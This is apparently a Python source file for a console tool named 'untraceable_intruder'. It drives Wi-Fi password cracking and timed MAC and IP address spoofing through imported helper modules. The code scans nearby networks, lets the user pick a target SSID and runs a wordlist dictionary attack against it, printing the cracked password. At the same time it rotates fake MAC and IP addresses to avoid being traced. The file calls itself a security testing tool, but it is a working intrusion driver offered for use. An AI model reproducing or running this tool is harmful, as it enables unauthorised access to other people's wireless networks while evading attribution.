#untraceable_intruder.py

import os
import threading
import time
import simple_MAC_spoofing
import simple_wifi_password_cracker
import simple_IP_spoofing
import untraceable_intruder_GUI as GUI
import sys
from datetime import datetime
import shutil

ColorControler = GUI.color_controler()
wifi_crack_engine = None
all_MAC = []
all_IP = []
stop_MAC_spoofing_event = threading.Event()
stop_IP_spoofing_event = threading.Event() 
stop_wifi_cracking_event = threading.Event()
_stop_MAC_spoofing = True
_stop_IP_spoofing = True
_stop_wifi_cracking = True
enable_logging = True

# ==================== LOGGING SYSTEM ====================
class SimpleLogger:
    def __init__(self, log_file="tool_activity.log"):
        self.log_file = log_file
        self._ensure_log_file()
    
    def _ensure_log_file(self):
        """Đảm bảo file log tồn tại"""
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w', encoding='utf-8') as f:
                f.write(f"=== TOOL ACTIVITY LOG ===\n")
                f.write(f"Created: {self._get_timestamp()}\n")
                f.write("=" * 30 + "\n\n")
    
    def _get_timestamp(self):
        """Lấy timestamp hiện tại"""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def log(self, message, level="INFO"):
        global enable_logging
        """Ghi log với timestamp và level"""
        if not enable_logging:
            return 
        timestamp = self._get_timestamp()
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        
        # In ra console với màu sắc
        if level == "ERROR":
            print(f"\033[91m{log_entry}\033[0m", end="")
        elif level == "SUCCESS":
            print(f"\033[92m{log_entry}\033[0m", end="")
        elif level == "WARNING":
            print(f"\033[93m{log_entry}\033[0m", end="")
        else:
            print(log_entry, end="")
        
        # Ghi vào file
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    
    def log_command(self, command):
        """Log các command được thực thi"""
        self.log(f"User executed command: {command}", "COMMAND")
    
    def log_operation(self, operation, status="started"):
        """Log các operation chính"""
        self.log(f"Operation '{operation}' {status}", "OPERATION")
    
    def log_security_event(self, event):
        """Log các sự kiện bảo mật quan trọng"""
        self.log(f"SECURITY EVENT: {event}", "SECURITY")

# Khởi tạo logger toàn cục
logger = SimpleLogger()

# ==================== MODIFIED FUNCTIONS ====================

def load_network_data_parallel():
    all_MAC_result = []
    all_IP_result = []
    
    def load_mac():
        nonlocal all_MAC_result
        all_MAC_result = simple_MAC_spoofing.get_all_mac()
    
    def load_ip():
        nonlocal all_IP_result
        all_IP_result = simple_IP_spoofing.get_all_ip()
    
    print_with_color("Loading network adapters and IP configurations...")
    logger.log("Loading network adapters and IP configurations...")
    
    thread_mac = threading.Thread(target=load_mac)
    thread_ip = threading.Thread(target=load_ip)
    
    thread_mac.start()
    thread_ip.start()
    
    thread_mac.join()
    thread_ip.join()
    
    return all_MAC_result, all_IP_result

def reset_tool(stop_other_process=False):
    global _stop_MAC_spoofing, _stop_IP_spoofing, _stop_wifi_cracking
    
    if stop_other_process:
        stop_MAC_spoofing_event.set()
        stop_IP_spoofing_event.set()
        stop_wifi_cracking_event.set()
        _stop_MAC_spoofing = True
        _stop_IP_spoofing = True
        _stop_wifi_cracking = True
        
        if not _stop_MAC_spoofing or not _stop_IP_spoofing or not _stop_wifi_cracking:
            time.sleep(0.5)
        
        print_with_color("ALL PROCESSES STOPPED...")
        logger.log("All processes stopped by user", "OPERATION")
        clear_old_fake()
        print_with_color("ALL FAKE IP AND MAC REMOVED...")

def better_input(question):
    try:
        answer = input(question).lower().strip()
        
        if answer in ('help', 'exit', 'end', 'stop', 'back', 'menu'):
            handle_special_commands(answer)
            return answer
        else:
            return answer
    except (EOFError, KeyboardInterrupt):
        return "exit"

def handle_special_commands(answer):
    if answer in ('end', 'stop'):
        reset_tool()
        print_with_color("Returning to main menu...")
    elif answer == 'exit':
        reset_tool()
        sys.exit()

def print_with_color(text, Enter=True):
    print(ColorControler.set_color(text), end="\n" if Enter else "", flush=True)

def show_mac():
    global all_MAC
    for i in all_MAC:
        for i2 in i.keys():
            print_with_color(f'{i2}: {i[i2]}')
        print_with_color('\n\n')
        
def show_IP():
    global all_IP
    for i in all_IP:
        for i2 in i.keys():
            print_with_color(f'{i2}: {i[i2]}')
        print_with_color('\n\n')

def try_crack(ID, passwords, crack_engine, stop_event):
    logger.log(f"Starting WiFi cracking attempt on network: {crack_engine.all_wifi[ID].ssid}", "OPERATION")
    
    for i in passwords:
        if not stop_event.is_set():
            password = crack_engine.try_password(ID, i)
            if password:
                success_msg = f"Password cracked! Target: {crack_engine.all_wifi[ID].ssid}, Password: {password}"
                print_with_color("\n\n\n============ TARGET PASSWORD CRACKED ============\n")
                print_with_color(f'TARGET: {crack_engine.all_wifi[ID].ssid}')
                print_with_color(f'PASSWORD: {password}\n')
                print_with_color('=================================================')
                
                logger.log(success_msg, "SUCCESS")
                logger.log_security_event(f"WiFi password cracked - SSID: {crack_engine.all_wifi[ID].ssid}")
                return True
        else:
            logger.log("WiFi cracking stopped by user", "OPERATION")
            break
    
    logger.log(f"WiFi cracking failed for network: {crack_engine.all_wifi[ID].ssid}", "WARNING")
    return False

def MAC_spoofing():
    global _stop_MAC_spoofing, stop_MAC_spoofing_event
    print_with_color(f'MAC spoofing mode is: {"OFF" if _stop_MAC_spoofing else "ON"}')
    
    answer = better_input('Do you want to turn `on` mac-spoofing-engine?(y/n): ' if _stop_MAC_spoofing else 'Do you want to turn `off` mac-spoofing-engine?(y/n): ')
    if answer in ('end', 'stop', 'back', 'menu'):
        return
    
    if answer.lower() in ('y', 'true', 'yes'):
        if _stop_MAC_spoofing:
            clear_old_fake()
            show_mac()
            
            # Cho phép nhập lại GUID nếu sai
            while True:
                GUID = better_input('Enter MAC GUID to fake (or "back" to return): ')
                if GUID in ('end', 'stop', 'back', 'menu'):
                    return
                
                if check_if_valid_GUID(GUID):
                    break  # GUID hợp lệ, thoát vòng lặp
                else:
                    # Hiển thị lại danh sách MAC để user dễ chọn
                    print_with_color("Available GUIDs:")
                    for adapter in all_MAC:
                        guid_display = adapter.get('InterfaceGuid') or adapter.get('GUID') or adapter.get('NetCfgInstanceId', 'N/A')
                        name = adapter.get('Name', 'Unknown')
                        print_with_color(f"  {guid_display} - {name}")
                    print_with_color("")
            
            time_delay = 0
            while time_delay < 30:
                try:
                    time_input = better_input('Enter delay time (second) (delay must >= 30): ')
                    if time_input in ('end', 'stop', 'back', 'menu'):
                        return
                    time_delay = float(time_input)
                except:
                    print_with_color('Please enter a valid number!')
            
            confirm = better_input('Are you sure to start MAC-spoofing-engine? (y/n): ')
            if confirm in ('end', 'stop', 'back', 'menu'):
                return
                
            if confirm.lower() in ('y', 'yes', 'true'):
                stop_MAC_spoofing_event.clear()
                threading.Thread(target=spoofing_MAC, args=(GUID, time_delay, stop_MAC_spoofing_event), daemon=True).start()
                _stop_MAC_spoofing = False
                print_with_color("MAC spoofing STARTED")
                logger.log(f"MAC spoofing started - GUID: {GUID}, Delay: {time_delay}s", "OPERATION")
        else:
            stop_MAC_spoofing_event.set()
            clear_old_fake()
            _stop_MAC_spoofing = True
            print_with_color("MAC spoofing STOPPED")
            logger.log("MAC spoofing stopped", "OPERATION")
            
def IP_spoofing():
    global _stop_IP_spoofing, stop_IP_spoofing_event
    print_with_color(f'IP spoofing mode is: {"OFF" if _stop_IP_spoofing else "ON"}')
    
    answer = better_input('Do you want to turn `on` IP-spoofing-engine?(y/n): ' if _stop_IP_spoofing else 'Do you want to turn `off` IP-spoofing-engine?(y/n): ')
    if answer in ('end', 'stop', 'back', 'menu'):
        return
    
    if answer.lower() in ('y', 'true', 'yes'):
        if _stop_IP_spoofing:
            clear_old_fake()
            show_IP()
            
            interface = better_input('Enter IP interface to fake (default = "Wi-Fi"): ') or "Wi-Fi"
            if interface in ('end', 'stop', 'back', 'menu'):
                return
                
            if check_if_valid_interface(interface):
                time_delay = 0
                while time_delay < 30:
                    try:
                        time_input = better_input('Enter delay time (second) (delay must >= 30): ')
                        if time_input in ('end', 'stop', 'back', 'menu'):
                            return
                        time_delay = float(time_input)
                    except:
                        print_with_color('Please enter a valid number!')
                
                confirm = better_input('Are you sure to start IP-spoofing-engine? (y/n): ')
                if confirm in ('end', 'stop', 'back', 'menu'):
                    return
                    
                if confirm.lower() in ('y', 'yes', 'true'):
                    stop_IP_spoofing_event.clear()
                    threading.Thread(target=spoofing_IP, args=(interface, time_delay, stop_IP_spoofing_event), daemon=True).start()
                    _stop_IP_spoofing = False
                    print_with_color("IP spoofing STARTED")
                    logger.log(f"IP spoofing started - Interface: {interface}, Delay: {time_delay}s", "OPERATION")
        else:
            stop_IP_spoofing_event.set()
            clear_old_fake()
            _stop_IP_spoofing = True
            print_with_color("IP spoofing STOPPED")
            logger.log("IP spoofing stopped", "OPERATION")

def clear_old_fake():
    global all_MAC, all_IP
    print_with_color("Clearing old fake addresses...")
    logger.log("Clearing old fake MAC and IP addresses", "OPERATION")
    
    # Reset MAC addresses
    for adapter in all_MAC:
        guid = adapter.get('GUID') or adapter.get('InterfaceGuid')
        if guid:
            simple_MAC_spoofing.reset_mac(guid)
    
    # Clear fake IPs
    simple_IP_spoofing.clear_fake_IP()

def check_if_valid_GUID(guid):
    global all_MAC
    normalized_guid = guid.upper().strip('{}')
    
    for adapter in all_MAC:
        adapter_guids = []
        if adapter.get('InterfaceGuid'):
            adapter_guids.append(adapter['InterfaceGuid'].upper().strip('{}'))
        if adapter.get('GUID'):
            adapter_guids.append(adapter['GUID'].upper().strip('{}'))
        if adapter.get('NetCfgInstanceId'):
            adapter_guids.append(adapter['NetCfgInstanceId'].upper().strip('{}'))
        
        if normalized_guid in adapter_guids:
            return True
    
    logger.log(f"Invalid GUID provided: {guid}", "WARNING")
    return False

def check_if_valid_interface(interface):
    global all_IP
    for adapter in all_IP:
        if interface.lower() == adapter.get('InterfaceAlias', '').lower():
            return True
    print_with_color(f"Interface {interface} không tồn tại!")
    logger.log(f"Invalid interface provided: {interface}", "WARNING")
    return False

def spoofing_IP(interface, time_delay, stop_event):
    logger.log(f"IP spoofing thread started for interface: {interface}", "OPERATION")
    while not stop_event.is_set():
        simple_IP_spoofing.private_IP_spoofing(interface=interface)
        time.sleep(time_delay)
    print_with_color('IP SPOOFING: STOPPED')
    logger.log("IP spoofing thread stopped", "OPERATION")
        
def spoofing_MAC(GUID, time_delay, stop_event):
    logger.log(f"MAC spoofing thread started for GUID: {GUID}", "OPERATION")
    while not stop_event.is_set():
        simple_MAC_spoofing.MAC_spoofing(GUID)
        time.sleep(time_delay)
    print_with_color('MAC SPOOFING: STOPPED')
    logger.log("MAC spoofing thread stopped", "OPERATION")

def wifi_cracking():
    global wifi_crack_engine, _stop_wifi_cracking, stop_wifi_cracking_event
    
    print_with_color(f'WiFi cracking mode is: {"OFF" if _stop_wifi_cracking else "ON"}')
    
    answer = better_input(f'Do you want to turn {"ON" if _stop_wifi_cracking else "OFF"} WiFi cracking? (y/n): ')
    if answer in ('end', 'stop', 'back', 'menu'):
        return
    
    if answer.lower() in ('y', 'yes', 'true'):
        if _stop_wifi_cracking:
            try:
                # Create WiFi crack engine
                wifi_crack_engine = simple_wifi_password_cracker.WifiCracker_Engine(
                    disconnect=True, 
                    time_connection_limit=10
                )
                
                if not wifi_crack_engine.all_wifi:
                    print_with_color("No WiFi networks found!")
                    logger.log("No WiFi networks detected during scan", "WARNING")
                    return
                
                # Show networks
                print_with_color('\n---------- AVAILABLE NETWORKS ----------')
                for idx, wifi in enumerate(wifi_crack_engine.all_wifi):
                    print_with_color(f'ID: {idx} | SSID: {wifi.ssid} | BSSID: {wifi.bssid}')
                print_with_color('----------------------------------------')
                
                logger.log(f"Found {len(wifi_crack_engine.all_wifi)} WiFi networks", "INFO")
                
                # Get target network ID
                net_ID = -1
                while True:
                    try:
                        net_ID_input = better_input('Enter target WiFi ID: ')
                        if net_ID_input in ('end', 'stop', 'back', 'menu'):
                            return
                        net_ID = int(net_ID_input)
                        if 0 <= net_ID < len(wifi_crack_engine.all_wifi):
                            target_ssid = wifi_crack_engine.all_wifi[net_ID].ssid
                            logger.log(f"User selected target network: {target_ssid} (ID: {net_ID})", "OPERATION")
                            break
                        else:
                            print_with_color(f'Invalid ID! Please enter 0-{len(wifi_crack_engine.all_wifi)-1}')
                    except ValueError:
                        print_with_color('Please enter a valid number!')
                
                # Load password file
                passwords = []
                while not passwords:
                    file_path = better_input('Enter password file path: ')
                    if file_path in ('end', 'stop', 'back', 'menu'):
                        return
                    if os.path.exists(file_path):
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                passwords = [line.strip() for line in f if line.strip()]
                            if not passwords:
                                print_with_color("File is empty!")
                            else:
                                print_with_color(f"Loaded {len(passwords)} passwords")
                                logger.log(f"Loaded password file: {file_path} with {len(passwords)} passwords", "OPERATION")
                        except Exception as e:
                            print_with_color(f"Error reading file: {e}")
                            logger.log(f"Error reading password file {file_path}: {e}", "ERROR")
                    else:
                        print_with_color("File not found!")
                
                # Start cracking
                confirm = better_input('Start cracking? (y/n): ')
                if confirm in ('end', 'stop', 'back', 'menu'):
                    return
                    
                if confirm.lower() in ('y', 'yes'):
                    _stop_wifi_cracking = False
                    stop_wifi_cracking_event.clear()
                    threading.Thread(
                        target=try_crack, 
                        args=(net_ID, passwords, wifi_crack_engine, stop_wifi_cracking_event),
                        daemon=True
                    ).start()
                    print_with_color("WiFi cracking STARTED")
                    logger.log("WiFi cracking process started", "OPERATION")
                    
            except Exception as e:
                error_msg = f"WiFi cracking setup error: {e}"
                print_with_color(error_msg)
                logger.log(error_msg, "ERROR")
                
        else:
            _stop_wifi_cracking = True
            stop_wifi_cracking_event.set()
            print_with_color("WiFi cracking STOPPED")
            logger.log("WiFi cracking stopped by user", "OPERATION")

def show_log():
    """Hiển thị nội dung log file"""
    try:
        with open(logger.log_file, 'r', encoding='utf-8') as f:
            content = f.read()
            print_with_color("\n=== LOG FILE CONTENT ===")
            print_with_color(content)
            print_with_color("=== END OF LOG ===")
    except Exception as e:
        print_with_color(f"Error reading log file: {e}")

def main():
    global all_MAC, all_IP
    
    print(f'\033[91m{GUI.title}\033[0m')
    print_with_color(GUI.credit)
    print_with_color(GUI.warning[0])
    
    # Log tool startup
    logger.log("Tool started", "OPERATION")
    logger.log_security_event("User started the security testing tool")
    
    if not str(input("Do you want to run (use) this tool (Y/N): ")).lower() in ('y', 'true', 't', '1'):
        logger.log("User declined to run the tool", "OPERATION")
        sys.exit()
    
    print_with_color("Initializing...")
    logger.log("Tool initialization started", "OPERATION")
    
    all_MAC, all_IP = load_network_data_parallel()
    
    # Debug info
    print_with_color(f"Found {len(all_MAC)} network adapters")
    print_with_color(f"Found {len(all_IP)} IP configurations")
    logger.log(f"Network scan completed: {len(all_MAC)} adapters, {len(all_IP)} IP configs", "INFO")
    
    clear_old_fake()
    
    # Main loop
    while True:
        try:
            code = better_input('\nEnter command ("help" for commands): ').lower().strip()
            
            # Log user command
            if code not in ('', 'help'):
                logger.log_command(code)
            
            if code == 'help':
                print_with_color(GUI.codes_list)
            elif code == 'show_mac':
                show_mac()
            elif code == 'show_ip':
                show_IP()
            elif code == 'mac_spoofing':
                MAC_spoofing()
            elif code == 'ip_spoofing':
                IP_spoofing()
            elif code == 'wifi_cracking':
                wifi_cracking()
            elif code == 'exit':
                print_with_color("Cleaning up...")
                logger.log("User exited the tool", "OPERATION")
                clear_old_fake()
                sys.exit()
                break
            elif code in ('stop', 'end'):
                reset_tool()
                print_with_color("Cleaning up...")
                clear_old_fake()
            elif code == 'clear':
                print_with_color("Cleaning up...")
                clear_old_fake()
            elif code == 'save_log':
                try:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    new_filename = f"tool_log_{timestamp}.log"
                    shutil.copy2(logger.log_file, new_filename)
                    print_with_color(f"Log saved as: {new_filename}")
                    logger.log(f"Log file saved as: {new_filename}", "OPERATION")
                except Exception as e:
                    print_with_color(f"Error saving log: {e}")
            elif code == 'log':
                global enable_logging
                print_with_color(f"Logging is currently: {'ENABLED' if enable_logging else 'DISABLED'}")
                answer = better_input("Toggle logging? (y/n) or press Enter to view log: ")
                if answer.lower() in ('y', 'yes', 'true', 't'):
                    enable_logging = not enable_logging
                    print_with_color(f"Logging {'ENABLED' if enable_logging else 'DISABLED'}")
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with open(logger.log_file, 'a', encoding='utf-8') as f:
                        f.write(f"[{timestamp}] [OPERATION] User {'enabled' if enable_logging else 'disabled'} logging\n")
                else:
                    show_log()
            elif code in ('back', 'menu'):
                print_with_color('still on the menu.')
            else:
                print_with_color("Unknown command! Type 'help' for available commands.")
                
        except KeyboardInterrupt:
            print_with_color("\nExiting...")
            logger.log("Tool interrupted by user (KeyboardInterrupt)", "OPERATION")
            clear_old_fake()
            break
        except Exception as e:
            error_msg = f"Unexpected error: {e}"
            print_with_color(error_msg)
            logger.log(error_msg, "ERROR")

if __name__ == '__main__':
    main()